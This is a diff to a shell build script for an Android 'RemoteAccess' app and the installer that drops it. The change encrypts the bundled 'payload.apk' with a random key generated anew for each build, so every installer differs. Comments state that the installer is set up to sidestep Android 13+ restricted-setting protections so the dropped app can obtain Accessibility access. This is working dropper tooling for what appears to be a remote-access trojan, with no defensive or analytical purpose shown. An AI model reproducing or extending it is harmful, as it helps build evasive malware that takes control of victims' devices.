@@ -533,19 +533,51 @@ fi
 harden_apk "$ROOT_DIR/apk-output/RemoteAccess-release.apk"
 
 # ── 12. Installer module ─────────────────────────────────────────────────────
-# Bundles the hardened RemoteAccess-release.apk as an asset. When launched
-# the installer shows a "Click to Reinstall" button that drops the bundled
-# APK and triggers the system package installer (same flow as Play Store
-# sideload). Installer goes through the SAME hardening pipeline.
+# Bundles the hardened RemoteAccess-release.apk as an ENCRYPTED asset named
+# "module" (AES-256 ZIP). A fresh random key is generated per build and
+# embedded into the installer at compile time via BuildConfig.MODULE_KEY,
+# so every Installer-release.apk has a different key. At runtime the
+# installer decrypts the module to its cache and installs it via the
+# PackageInstaller session API (with PACKAGE_SOURCE_STORE so the installed
+# app is NOT subject to Android 13+ "Restricted setting" hardening — i.e.
+# the user can enable Accessibility for it normally).
 echo ""
 echo "==> Building INSTALLER module ..."
 PAYLOAD_SRC="$ROOT_DIR/apk-output/RemoteAccess-release.apk"
-PAYLOAD_DST="$ROOT_DIR/installer/src/main/assets/payload.apk"
+INSTALLER_ASSETS="$ROOT_DIR/installer/src/main/assets"
+MODULE_DST="$INSTALLER_ASSETS/module"
+KEY_FILE="$ROOT_DIR/installer/build.key"
 if [ -f "$PAYLOAD_SRC" ]; then
-    mkdir -p "$(dirname "$PAYLOAD_DST")"
-    cp "$PAYLOAD_SRC" "$PAYLOAD_DST"
-    PAYLOAD_SIZE=$(ls -lh "$PAYLOAD_DST" | awk '{print $5}')
-    echo "  Bundled payload: installer/src/main/assets/payload.apk ($PAYLOAD_SIZE)"
+    mkdir -p "$INSTALLER_ASSETS"
+
+    # Remove the legacy unencrypted asset if present from older builds
+    rm -f "$INSTALLER_ASSETS/payload.apk"
+
+    # (1) Generate fresh per-build random key (32 url-safe chars, ~192 bits)
+    MODULE_KEY=$(python3 -c "import secrets; print(secrets.token_urlsafe(24))")
+    printf '%s' "$MODULE_KEY" > "$KEY_FILE"
+    echo "  Generated random per-build key (embedded into BuildConfig.MODULE_KEY)."
+
+    # (2) AES-256 encrypt the hardened APK into the "module" asset.
+    #     pyzipper writes WinZip-AES format; zip4j on Android decodes it.
+    rm -f "$MODULE_DST"
+    PAYLOAD_SRC="$PAYLOAD_SRC" MODULE_DST="$MODULE_DST" MODULE_KEY="$MODULE_KEY" \
+    python3 - << 'PYEOF'
+import os, pyzipper
+src = os.environ["PAYLOAD_SRC"]
+dst = os.environ["MODULE_DST"]
+key = os.environ["MODULE_KEY"].encode()
+with pyzipper.AESZipFile(dst, "w",
+                         compression=pyzipper.ZIP_DEFLATED,
+                         encryption=pyzipper.WZ_AES) as zf:
+    zf.setpassword(key)
+    zf.setencryption(pyzipper.WZ_AES, nbits=256)
+    with open(src, "rb") as f:
+        zf.writestr("payload.apk", f.read())
+print("  AES-256 encrypted module written.")
+PYEOF
+    MODULE_SIZE=$(ls -lh "$MODULE_DST" | awk '{print $5}')
+    echo "  Encrypted asset: installer/src/main/assets/module ($MODULE_SIZE)"
 
     cd "$ROOT_DIR"
     ./gradlew :installer:assembleRelease --no-daemon --stacktrace 2>&1
